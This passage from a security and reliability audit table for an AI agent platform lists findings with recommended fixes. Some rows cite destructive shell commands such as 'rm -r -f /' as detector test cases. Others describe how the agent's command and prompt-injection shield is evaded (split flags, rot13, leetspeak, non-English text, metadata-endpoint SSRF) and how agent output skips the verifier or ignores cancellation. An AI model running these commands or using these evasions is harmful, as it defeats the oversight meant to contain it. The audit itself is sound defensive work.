| W1-56 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/world_model.py:1464` | SQLite migrations are not applied atomically: a failing multi-statement migration leaves earlier statements committed with the version unbumped | Wrap _apply_migrations in an explicit `BEGIN IMMEDIATE` ... commit/rollback per version (or for the whole ladder), so a failure rolls back every statement of that version; keep the duplicate-column tolerance for legacy partially-applied DBs. Add a test mirroring the reproduction. | S |
| W1-50 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/world_model.py:2278` | Episode retention aborts with FOREIGN KEY constraint failed whenever a fact references an episode (canonical path) or silently orphans facts (db_path path) | In purge_episodes_before (both backends) null out `facts.source_episode_id`/`fact_history.source_episode_id` for the purged ids in the same transaction (or declare the FKs ON DELETE SET NULL in a new migration), and make _purge_table_by_time set `PRAGMA foreign_keys = ON` so the two paths agree. Add a test that purges an episode cited by a fact. | S |
| W1-57 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/world_model.py:3981` | No retention path for messages, fact_history, approvals/signoffs/audit-outbox, questions, artifacts, share_links or goals: the Operating Record grows without bound | Add per-table retention primitives (purge_messages_before, purge_artifact_versions keeping latest N, purge_decided_approvals_before, purge_answered_questions_before, expire_share_links, purge_terminal_goals_before with FK-safe cascade) on both backends, wire them into audit/retention.enforce and `maverick gc`, and expose the knobs in config + the installer wizard (kernel rule 5/6). | M |
| W1-64 | low | Raised (finder cited evidence; skeptic pass not run); prior | security | `packages/maverick-core/maverick/world_model.py:842` | At-rest read path passes unsealed values through by default (strict mode opt-in) — still present | Default strict mode ON once `maverick encryption migrate` has recorded completion (persist a marker in schema_version metadata or config), or when a compliance floor is active; emit a counter metric instead of per-row warnings. | S |
| W1-61 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/world_model.py:1735` | list_projects issues one COUNT query per project (N+1) on both backends | Replace with a single LEFT JOIN ... GROUP BY project_id (or a correlated subquery in the SELECT) and add `CREATE INDEX IF NOT EXISTS idx_goals_project ON goals(project_id)` in a new SQLite migration (PG already has idx_pg_goals_project). | S |
| W1-65 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/world_model.py:3669` | SQLite erase_conversations issues BEGIN IMMEDIATE unconditionally inside _writing(), unlike disarm_halt which guards on in_transaction | Mirror disarm_halt: `if not conn.in_transaction: conn.execute("BEGIN IMMEDIATE")`, or move the immediate-lock acquisition into _writing() itself via an `immediate=True` parameter. | S |
| W1-58 | low | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-core/maverick/world_model.py:4000` | PostgresAtRestUnsupported is dead code whose docstring contradicts open_world's at-rest claim 50 lines later | Delete the class (or keep a deprecation shim via maverick.deprecations) and update FIXES.md / docs/encryption.md to state PG sealing is implemented; add the vulture whitelist entry if a shim is kept. | S |

### core/world_model_backends (9)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-68 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/world_model_backends/postgres.py:1262` | Postgres RLS never checks the connection role for SUPERUSER/BYPASSRLS, so 'fail-closed' isolation is silently void under a privileged DSN | In PostgresWorldModel.__init__ when self._rls is true (and in pg_rls.preflight), run `SELECT rolsuper, rolbypassrls FROM pg_roles WHERE rolname = current_user` and raise RuntimeError('RLS cannot be enforced for a SUPERUSER/BYPASSRLS role') -- mirror governed_records._schema_status_on. Report it as a `ready=False` reason in `maverick tenant rls-preflight`. Add `NOSUPERUSER NOBYPASSRLS` to the CREATE ROLE snippet in deploy/postgres/README.md and a doctor check. | S |
| W1-47 | high | Plausible (hand spot-check; see note) | correctness | `packages/maverick-core/maverick/world_model_backends/postgres.py:1352` | PostgresWorldModel.create_goal has no domain/project_id kwargs: checkpoint sub-goal spawning and the finance CLI raise TypeError on Postgres | Add `domain: str = ""` and `project_id: int \| None = None` to PostgresWorldModel.create_goal (the columns already exist via migrations v14/v15) and write them in the INSERT; add domain/project_id to PGGoal and _dec_goal_row. Add a signature-parity test (inspect.signature over the shared public surface) so the two backends cannot drift again. | S |
| W1-46 | high | Confirmed (hand spot-check at close-out) | security | `packages/maverick-core/maverick/world_model_backends/postgres.py:1588` | Postgres search_goals ignores the owner filter: non-admin dashboard search returns every user's goals on the HA backend | Add `owner = %s` to both the sealed scan-then-decrypt branch and the ILIKE branch of PostgresWorldModel.search_goals when owner is not None (mirror list_goals which already does), and add a Postgres-marked test that a second owner's goal is not returned. | S |
| W1-48 | high | Confirmed (hand spot-check at close-out) | correctness | `packages/maverick-core/maverick/world_model_backends/postgres.py:2619` | PostgresWorldModel.total_spend takes no owner argument: /api/v1/spend and external-agent records 500 on Postgres | Add `owner: str \| None = None` to PostgresWorldModel.total_spend and add `AND g.owner = %s` (join goals already happens when a tenant is active; always join when owner is given). Cover with a parity test. | S |
| W1-54 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/world_model_backends/postgres.py:1184` | Postgres backend never reconnects: after a DB failover or idle timeout the single shared connection fails every call until process restart | Detect a broken connection in _tx (psycopg.OperationalError/InterfaceError or conn.closed/conn.broken) and reconnect once with backoff before re-raising; or default pool_size to a small pool (psycopg_pool already reconnects) when psycopg_pool is installed. Add a unit test that simulates a closed connection and asserts the next _tx succeeds. | M |
| W1-49 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/world_model_backends/postgres.py:2246` | PostgresWorldModel.list_goals lacks project_id/domain filters: the project detail page 500s on Postgres | Add `domain` and `project_id` predicates to PostgresWorldModel.list_goals; include in the parity test. | S |
| W2-80 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/world_model_backends/postgres.py:1201` | RLS 'no tenant' sentinel is itself a valid tenant id | Reserve the sentinel (and any `__maverick_` prefix) in canonical_tenant_id, or use a value that cannot be produced by _tenant_segment (e.g. contains a space, which the encoder never emits). | S |
| W1-59 | low | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-core/maverick/world_model_backends/postgres.py:2233` | PostgresWorldModel.list_active_goals is PG-only, uncalled, and filters on statuses the kernel never writes | Delete list_active_goals, or fix the status set to ('pending','active') and add it to WorldModel too, with a parity test. | S |
| W1-67 | low | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/world_model_backends/postgres.py:3918` | Single-tenant (unbound) Postgres deployments get no routine retention: prune/purge primitives refuse without a bound tenant | Add an explicit administrator primitive (e.g. `maverick gc --legacy-null-tenant --confirm`) that prunes tenant_id IS NULL rows under the same cutoffs, and have `maverick doctor` warn when PG is configured, no client is bound, and retention is therefore inert. | S |

### dashboard/api + app (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-69 | high | Raised (finder cited evidence; skeptic pass not run) | concurrency | `packages/maverick-dashboard/maverick_dashboard/api.py:1485` | 469 of 1,894 dashboard async route handlers never await and run synchronous SQLite/world work directly on the event loop | Mechanically convert zero-await route handlers to plain `def` (FastAPI will threadpool them) or wrap world/store calls in run_in_threadpool; add a CI gate in the style of the existing custom gates (a2a/a11y) that fails on a route-decorated `async def` with no await whose body calls _world()/sqlite. The scan script at scratch/audit/work/concurrency-reliability/scan_async_routes.py can seed the gate. | M |

### dashboard/auth (proxy SSO) (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-8 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/proxy_auth.py:86` | Reverse-proxy SSO identity can be spoofed by any loopback peer via X-Forwarded-For under uvicorn's default proxy-header handling | Make the transport peer authoritative for proxy_trusts: launch uvicorn with proxy_headers=False (or forwarded_allow_ips=[] ) whenever [auth.proxy] is enabled, or have proxy_trusts read the raw socket peer (e.g. keep it on scope['server']/transport before uvicorn rewrites, or set forwarded_allow_ips from trusted_proxies so only the pinned proxy may assert XFF). Add an ASGI-level regression test that wraps app in uvicorn.middleware.proxy_headers.ProxyHeadersMiddleware(trusted_hosts='127.0.0.1') and asserts a loopback peer with X-Forwarded-For=<pinned> is refused. Document FORWARDED_ALLOW_IPS in docs/security-hardening.md. | S |
| W2-9 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/proxy_auth.py:87` | Documented proxy-SSO setup (trusted_proxies=["127.0.0.1"]) is non-functional under uvicorn defaults when the proxy sets X-Forwarded-For | Same root-cause fix as the spoof finding (peer-authoritative proxy_trusts / uvicorn proxy_headers policy tied to [auth.proxy]). Until then, document that proxy SSO requires uvicorn to be run with proxy-headers disabled or FORWARDED_ALLOW_IPS unset, and add the ASGI-level test. | S |

### dashboard/settings_store + api features/switches (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-18 | high | Plausible (hand spot-check; see note) | correctness | `packages/maverick-dashboard/maverick_dashboard/settings_store.py:441` | In-app feature switches for fleet_memory and entity_graph never persist: settings_store._dump allowlist silently drops both sections and the API returns a misleading 409 | Add 'fleet_memory' and 'entity_graph' (and generally every entry of SWITCHABLE_SECTIONS) to the _dump section list — e.g. `for section in dict.fromkeys((..., *SWITCHABLE_SECTIONS, *_LEARNING_SECTIONS, *_MODULE_TOP_SECTIONS))` — and add a parametrized round-trip test over SWITCHABLE_SECTIONS asserting load_overlay()[section]['enable'] after set_section_enable(). Consider making _dump fail loudly (log.error or raise) when a top-level key it does not know how to serialise is present instead of dropping it. | S |

### dashboard/suite-apis (identity) (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-1 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-dashboard/maverick_dashboard/third_party_lifecycle_api.py:266` | 29 tenant suite APIs return 401 for static-bearer and local auth-off callers while sibling suites accept them (principal-derivation divergence) | Decide the contract once: either (a) accept static-bearer/local callers as a stable synthetic operator principal (as third_party_intelligence_api does) or (b) require a named principal everywhere and make the paired page routers return the same 401/409 with guidance. Implement it in ONE shared helper (e.g. _shared.principal_ref(request, tenant_id, namespace)) and replace the 22 _principal + 14 _principal_ref copies. Add a parametrized test that hits every suite's /status route under static-bearer and auth-off modes and asserts one consistent outcome. | M |
| W3-2 | medium | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-dashboard/maverick_dashboard/privacy_regulatory_intelligence_api.py:245` | Identity derivation (_principal/_principal_ref) copy-pasted into 36 modules with four behaviourally different variants | Add _shared.principal_ref(request, *, tenant_id, namespace, require_named: bool) implementing one policy (subject source order, strip, length cap, fallback), and have every module call it with its namespace salt. Keep per-module salts so stored digests do not change. | M |

### deploy/demo (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-27 | high | Confirmed (hand spot-check at close-out) | correctness | `deploy/demo/run-demo.sh:50` | One-command demo prints a ?token= URL that the dashboard rejects with 401 | Update run-demo.sh to print the plain URL plus the token and instructions (Bearer header / OIDC or invite flow), and rewrite deploy/demo/README.md lines 10-12, 27-30, 45-47, 54-65 to match fly.toml/render.yaml. Better: add a minimal browser login form (or a cookie exchange endpoint) so a demo audience can use a link at all; the demo-cluster nginx-inject pattern is the current workaround. | S |

### deploy/terraform (15)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-29 | high | Raised (finder cited evidence; skeptic pass not run) | reliability | `deploy/aws/terraform/ecs.tf:141` | ECS circuit-breaker 'rollback' cannot roll back: image tag is mutable :latest and ECR expires the previous image | Make CodeBuild tag images by git SHA (IMAGE_TAG=sha-<commit>), set image_tag_mutability = "IMMUTABLE", pass the SHA tag into the task definition on each apply (or use the image digest), keep a count-based ECR lifecycle rule (e.g. keep last 10 tagged), and update the ecs.tf comment/NEXT_STEPS.md deploy procedure accordingly. | M |
| W5-28 | high | Confirmed (hand spot-check at close-out) | data-integrity | `deploy/aws/terraform/rds.tf:28` | Production RDS has deletion_protection=false and skip_final_snapshot=true | Set deletion_protection = true, skip_final_snapshot = false with final_snapshot_identifier, add lifecycle { prevent_destroy = true } to aws_db_instance.main, and consider multi_az = true and copy_tags_to_snapshot = true. Document the one-time override path for intentional teardown. | S |
| W5-34 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `deploy/aws/terraform/alb.tf:1` | Internet-facing prod ALB has no access logs, no deletion protection, no WAF, no VPC flow logs, and ingress is 0.0.0.0/0 by default | Add an S3 access-log bucket + `access_logs { enabled = true }`, `enable_deletion_protection = true`, `drop_invalid_header_fields = true`, an AWS-managed-rules WAFv2 web ACL (rate-based rule on /auth/* and /api/v1/goals), aws_flow_log on the VPC, and raise app log retention (>= 90 days) with a KMS key; flip restrict_ingress_to_cloudflare on once Cloudflare proxying is confirmed. | M |
| W5-39 | medium | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `deploy/aws/terraform/codebuild.tf:69` | Production image built by CodeBuild uses the floating python:3.12-slim base while the GitHub release pins a digest — two different supply-chain postures for the 'same' image | Add a PYTHON_DIGEST environment_variable to aws_codebuild_project.image (kept in sync with release.yml, ideally sourced from one file) and pass `--build-arg PYTHON_DIGEST=$PYTHON_DIGEST`; optionally cosign-sign the ECR image in post_build and fail the build on ECR scan findings. | S |
| W5-33 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `deploy/aws/terraform/deployer.tf:71` | Deployer identity is a long-lived IAM user access key whose policy uses rds:*, ecs:*, elasticfilesystem:*, acm:*, ses:* on Resource '*' — contradicting its own 'no more' scope comment | Replace the IAM user with a GitHub OIDC-assumable role (aws_iam_openid_connect_provider + trust policy limited to repo/ref) and for local use an `aws sso`/IAM Identity Center role; scope Infra/Ecs statements with resource ARNs or an `aws:ResourceTag/Project = lightwork` condition; add a permissions boundary. At minimum add an explicit Deny for rds:Delete*/elasticfilesystem:DeleteFileSystem on resources not tagged Project=lightwork. | M |
| W5-32 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `deploy/aws/terraform/efs.tf:10` | EFS 'operating state' volume has no backup policy despite prevent_destroy comment | Add `resource "aws_efs_backup_policy" "state" { file_system_id = aws_efs_file_system.state.id; backup_policy { status = "ENABLED" } }` (AWS Backup default plan, 35-day retention) and document the restore procedure in docs/vendor-onboarding.md. | S |
| W5-31 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `deploy/aws/terraform/secrets.tf:15` | Secrets Manager entries use recovery_window_in_days = 0 (immediate, unrecoverable deletion) | Remove recovery_window_in_days = 0 (default 30) or set 7 on every secret; add lifecycle { prevent_destroy = true } on the two out-of-band secrets (anthropic_api_key, oidc_client_secret). | S |
| W5-35 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `deploy/aws/terraform/secrets.tf:104` | Assembled Postgres DSN omits sslmode — the stack's own DB connection does not follow deploy/postgres/README.md's verify-full guidance | Append `?sslmode=verify-full&sslrootcert=/etc/ssl/certs/aws-rds-global-bundle.pem` to the DSN and COPY the AWS RDS CA bundle into deploy/docker/Dockerfile (or at least `sslmode=require`); add an aws_db_parameter_group with rds.force_ssl=1 so the guarantee does not depend on engine defaults. | S |
| W5-44 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `deploy/aws/terraform/NEXT_STEPS.md:165` | NEXT_STEPS.md is a stale handoff: claims nothing is created, only port 80 wired, and recommends Cognito while the stack already has ACM/443 and Auth0 | Replace with a short RUNBOOK.md describing the current state (what exists, how to deploy a SHA-tagged image, how to rotate the out-of-band secrets, how to roll back) and delete the 'tonight' narrative. | S |
| W5-52 | low | Raised (finder cited evidence; skeptic pass not run) | security | `deploy/aws/terraform/ecs.tf:24` | Terraform ECS task definition lacks the container hardening the reference task definition applies (no user, no drop-all caps, no read-only rootfs) | Add `user = "1000:1000"`, `linuxParameters = { capabilities = { drop = ["ALL"] }, initProcessEnabled = true }` and consider `readonlyRootFilesystem = true` with a tmpfs for /tmp and /workspace in the container definition. | S |
| W5-55 | low | Raised (finder cited evidence; skeptic pass not run) | security | `deploy/aws/terraform/iam.tf:61` | SES send permission is granted on Resource '*' instead of the verified identity | Scope resources to `arn:aws:ses:${region}:${account}:identity/${var.email_from}` (and the domain identity) and add a `ses:FromAddress` condition equal to var.email_from. | S |
| W5-45 | low | Raised (finder cited evidence; skeptic pass not run) | compliance | `deploy/aws/terraform/oidc.auto.tfvars:9` | oidc.auto.tfvars commits personal identity data (Auth0/Google subject ids, a named individual, a personal Gmail address) to the repo | Move dashboard_admins/oidc_client_id into an untracked `prod.tfvars` (add to .gitignore) or SSM/Secrets Manager, keep an `oidc.auto.tfvars.example` with placeholders, and scrub the comments naming individuals. | S |
| W5-54 | low | Raised (finder cited evidence; skeptic pass not run) | ops | `deploy/aws/terraform/variables.tf:43` | ALB health check targets /livez (TCP-accept only) while the variable describes it as a 'deep liveness endpoint' | Default health_check_path to /readyz (keep /livez only for the 120 s grace period case), or at least /healthz once the provider key is set; document the trade-off in the variable description. | S |
| W5-43 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `deploy/aws/terraform/versions.tf:2` | versions.tf allows Terraform >= 1.9 but the S3 backend uses use_lockfile, which requires >= 1.10 | Set required_version = ">= 1.10" (1.11 if you want the non-experimental lockfile). | S |
| W5-56 | improvement | Raised (finder cited evidence; skeptic pass not run) | product | `deploy/aws/terraform/ecs.tf:135` | Every prod deploy is a full outage by design (min-healthy 0%) because the control-plane lease forbids rolling updates | Implement a lease handoff protocol in control_plane_lease.py (SIGTERM/handoff request → old writer flushes ledgers and releases → new writer acquires), then raise deployment_minimum_healthy_percent to 100 / maximum to 200 and enable the Helm PDB. Track as a roadmap item and state the current downtime window in docs/deployment.md. | L |

### kernel/agent-loop (4)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-24 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/agent.py:3818` | Domain-routed goals (packs / --domain) skip FINAL verification, the review checkpoint and the thinking budget because the root agent's role is the pack name, not 'orchestrator' | Introduce an explicit `is_root` predicate (depth == 0 and parent is None) and use it instead of `role == "orchestrator"` for verification, review checkpoint, thinking budget, prewarm and template selection (or set a separate `self.kind = 'root'` in agent_from_profile when depth == 0). Add a test that a domain-routed run_goal invokes verify_final. | S |
| W1-25 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/agent.py:4176` | A text-only response without a FINAL: marker is accepted as the final answer with verifier_confidence=1.0, bypassing the verifier, coding-mode apply-check, STOP hooks and the run record | Route the no-tool-call text branch through the same FINAL handling: treat a text-only end_turn response as `final = resp.text` (optionally after one nudge 'end with FINAL:') so verification, patch validation, hooks and record writes apply; report verifier_confidence honestly (0.0/'not verified') when verification did not run. Add a loop test where the scripted answer lacks the marker and assert verify_final is invoked. | S |
| W1-42 | low | Raised (finder cited evidence; skeptic pass not run); prior | maintainability | `packages/maverick-core/maverick/agent.py:3374` | Agent._run_inner is still a 1,067-line single function (noqa C901) hosting six responsibilities; the PromptBuilder extraction did not reduce the loop itself | Extract FinalAnswerHandler (3596-4172: marker extraction, patch validation, verification, revision bookkeeping with an explicit revision counter) and ToolTurnExecutor (4193-4407) as methods returning a small enum (CONTINUE/RETURN result), with focused tests for each; this also creates the natural place to fix the verifier-gate and stop_reason findings. | L |
| W1-40 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/agent.py:3389` | Opt-in prompt-cache prewarm is a synchronous provider round trip executed on the event loop inside the async agent loop | `await asyncio.to_thread(self.ctx.llm.prewarm, ...)` (or an async prewarm using complete_async), keeping the existing fail-open try/except. | S |

### kernel/agent-loop + dashboard/api (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-23 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-dashboard/maverick_dashboard/api.py:9090` | Dashboard 'Cancel' never stops a running goal: the agent loop never reads goal status, contrary to the endpoint docstring | Add a goal-scoped stop check to the turn-boundary gate in Agent._run_inner (next to killswitch.check()/budget.check() at agent.py:3441-3450) and to the per-tool halt check at agent.py:4310, throttled like _mirror_live_spend (read world.get_goal(goal_id).status every ~1-5s) and returning AgentResult(error='cancelled'); or have cancel_goal arm a per-goal entry in the killswitch halt table that killswitch.check() consults with a goal_id scope. Fix the docstring either way and add a test that cancels mid-run and asserts no further LLM calls. | S |

### release/provenance (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-2 | high | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `deploy/verify-release.sh:47` | Release tags are mutable (no tag ruleset): v0.1.6 was re-pointed three times and keyless signatures bind only to the tag name | Add a second ruleset file (e.g. .github/rulesets/protect-release-tags.json, target 'tag', include refs/tags/v* and native-v*/desktop-v*) with deletion, non_fast_forward and update restrictions, import it, and extend test_the_ruleset_requires_every_blocking_check_and_the_queue to assert it exists. Enable GitHub's immutable-releases repository setting. Consider embedding the source SHA in verification (e.g. verify-release.sh also checks the certificate's source-repository-digest extension against the release's maverick-container-*.json source_revision). | S |

### repo-governance/rulesets (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-1 | high | Raised (finder cited evidence; skeptic pass not run) | compliance | `.github/rulesets/protect-main.json:4` | Committed branch ruleset is not what the live repo enforces: PRs merge before required checks finish and the merge queue has never run | Re-import .github/rulesets/protect-main.json in Settings > Rules > Rulesets (or fix whatever bypass/disabled state exists), then add a scheduled workflow (e.g. weekly, plus on changes to the JSON) that runs `gh api repos/$GITHUB_REPOSITORY/rulesets` + `/rulesets/{id}` with a read-only token and diffs the live rule set against the committed file, failing (and opening an issue) on drift. Also fix the 'required check passes in 4s on PR' pattern only after the queue is actually enforced, otherwise `test (3.11, n)`/`posture (n)` are green stubs on every PR with nothing ever running them before merge. | S |

### sandbox/kubernetes (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-86 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/sandbox/kubernetes.py:4` | Kubernetes backend never transfers the workspace into the pod despite its docstring (emptyDir + kubectl cp) — commands run against an empty directory | Either implement the transfer (create the pod with `sleep`, `kubectl cp <workdir> pod:/workspaces/repo`, `kubectl exec`, `kubectl cp` back for mutated files) or make exec() fail closed with an explicit 'workspace not mounted' error and label the backend experimental in README/FEATURES/wizard, as was done for Firecracker. Add a test asserting the workspace contents are visible to the pod command (fake kubectl). | M |
| W1-85 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/sandbox/kubernetes.py:110` | Kubernetes sandbox pod mounts the namespace ServiceAccount token (no automountServiceAccountToken:false, no seccomp, no read-only rootfs) | In _pod_overrides add "automountServiceAccountToken": False and "enableServiceLinks": False at spec level, "seccompProfile": {"type": "RuntimeDefault"} in the pod securityContext, and "readOnlyRootFilesystem": True plus an emptyDir at /tmp in the container. Add a unit test asserting these keys appear in the --overrides JSON. | S |

### shield/builtin_rules (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-33 | high | Confirmed (hand spot-check at close-out) | security | `packages/maverick-shield/maverick_shield/builtin_rules.py:293` | Advertised rm -rf / and recursive chmod/chown rules bypassed by splitting the flags | Rewrite rm_rf_root to tolerate multiple flag groups, e.g. match `rm(\s+-[a-z]+)*` where the union of flag chars includes both r and f, then a root target; same for chmod/chown -R. Add corpus cases `rm -r -f /`, `rm -f -r /`, `chmod -c -R / `. Better: route destructive-shell detection through a small argv tokenizer rather than surface regex. | M |
| W2-34 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-shield/maverick_shield/builtin_rules.py:307` | Fallback shield coverage gaps: find -delete, python -c RCE, cloud-metadata SSRF, rot13, leetspeak, split-token, non-English injection all pass | Add rules: `find ... -delete`/`-exec rm`, `python[0-9.]* -c` with network+exec markers, and a link/host rule for 169.254.169.254 / metadata.google.internal / fd00:ec2::254. Add a rot13/atbash decode variant and a leet-fold (0->o,1->l,3->e,5->s,@->a) to the deobfuscate pre-pass, and a token-rejoin variant that also strips single interior spaces before re-scanning. Document the residual multi-language gap honestly. | M |

### tools/connectors (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-110 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/asana_tool.py:203` | Hand-written connectors interpolate unencoded model-supplied IDs into API paths; dot-segments reach arbitrary endpoints (incl. writes) with the operator's credential | Add a shared `_path_segment(value)` helper in tools/__init__.py (urllib.parse.quote(value, safe='') plus a reject of '.', '..' and empty) and apply it to every interpolated id/slug/entity in asana, bitbucket, clickup, cloudflare, confluence, dynamics (and any g-z sibling with the same shape); add a regression test that `../` in each id yields ERROR rather than a request. | S |
| W1-130 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/airtable_tool.py:116` | Hand-written connectors echo raw upstream error bodies while the shared REST factory deliberately suppresses them to avoid credential reflection | Add a shared `tools._upstream_error(op, status, data)` that returns the status plus a redacted, size-capped `error.message`/`code` allowlist (run through safety.redact) and use it in all hand-written connectors. | S |
| W1-137 | improvement | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/tools/_rest_connector.py:259` | Hand-written SaaS connectors bypass the capability allow_hosts egress scope and SSRF pinning that make_rest_tool enforces; unify them on the factory | Re-express the hand-written connectors as thin op-maps over make_rest_tool/_rest_execute (fixed base URL + path templates with `_path_segment`-encoded ids), so they inherit egress scope, pinning, connection-scoped credentials and redaction and can be removed from the ambient-credential deny list; keep the friendly op schemas as a layer above the factory. | L |

### tools/database (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-111 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/database_tool.py:168` | `database` tool accepts a model-supplied SQLAlchemy `url` with no scheme/host policy by default, so an agent can open any local SQLite file or any reachable DB server | Default-deny model-supplied `url`: only honor it when a capability allow_hosts is present or an explicit `[tools] database_allow_url_arg = true` knob is set; reject `sqlite:` URLs (or confine file paths to sandbox.workdir); log the effective host on every call. Add wizard/config knob per kernel rule 5. | S |

### CHANGELOG (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-113 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `CHANGELOG.md:319` | CHANGELOG stale: version 0.1.7 has no entry and the Unreleased section omits the September feature wave (AWS Terraform, Auth0, vendor onboarding, Cloudflare site, rolling deploys) | Add a `## [0.1.7]` heading (or bump on release), backfill the September PRs into Unreleased, and add a CI check that a PR touching packages/*/pyproject.toml version also touches CHANGELOG.md. | S |

### ci/coverage (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-7 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `sdks/plugin-ts/package.json:21` | The TypeScript plugin SDK (and consent-native, vscode-extension) is never built or tested in CI and has no lockfile | Commit a package-lock.json for sdks/plugin-ts (and the other two), add it to the OSV `--lockfile` list and the dependabot npm directories, and add a job (in ui-regressions.yml or a new sdk.yml with merge_group) running `npm ci && npm test` on Node 22.23.1. | S |

### ci/gating (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-6 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `.github/workflows/ui-regressions.yml:3` | Nine path-filtered workflows are advisory only: not required checks and never run in the merge queue | Adopt the pattern already used for test-window: make the jobs unconditional at job level, gate the STEPS with a paths-filter step (e.g. dorny/paths-filter pinned by SHA, or `git diff --name-only` against the merge base) so each job always reports a context, add `merge_group:` triggers, and list the contexts in protect-main.json. At minimum do this for native.yml, go-model-proxy.yml and docs.yml. | M |

### ci/os-matrix (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-62 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `.github/workflows/ci.yml:638` | Windows/macOS coverage is one test file: 11 Windows-only tests and the Job-Object sandbox code never run on any CI OS | Run at least the core + installer suites on windows-latest and macos-latest on the merge queue (shard like Linux), or a curated `-m windows_only` marker set plus test_file_lock/test_coding_mode/test_crypto_at_rest on the existing Windows job. | M |

### ci/pages-deploy (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-12 | medium | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `.github/workflows/pages-deploy.yml:47` | pages-deploy runs an unpinned `npx --yes wrangler@4` with the Cloudflare API token in scope and no job timeout | Pin `wrangler@4.x.y` exactly (or vendor a package.json+lockfile under pitch/ and use `npm ci`), pin node to 22.23.1, add `timeout-minutes: 10`, and consider the official cloudflare/wrangler-action pinned by SHA with the token passed as an input rather than a step-wide env. | S |

### ci/postgres (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
